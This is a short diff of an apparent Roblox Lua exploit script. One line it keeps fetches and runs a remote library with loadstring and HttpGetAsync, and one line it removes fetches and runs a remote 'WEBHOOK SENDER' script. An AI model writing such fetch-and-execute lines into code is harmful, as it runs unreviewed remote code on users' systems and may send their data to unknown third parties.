@@ -13,7 +13,6 @@ _G.NullConfig = {
     
 loadstring(game:HttpGetAsync('https://raw.githubusercontent.com/sleepyvill/script/refs/heads/main/lib.lua'))()
 
-loadstring(game:HttpGetAsync('https://raw.githubusercontent.com/RblxScriptsOG/webhook/refs/heads/main/WEBHOOK%20SENDER.lua'))()
 
         
         local RS = game:GetService("ReplicatedStorage")
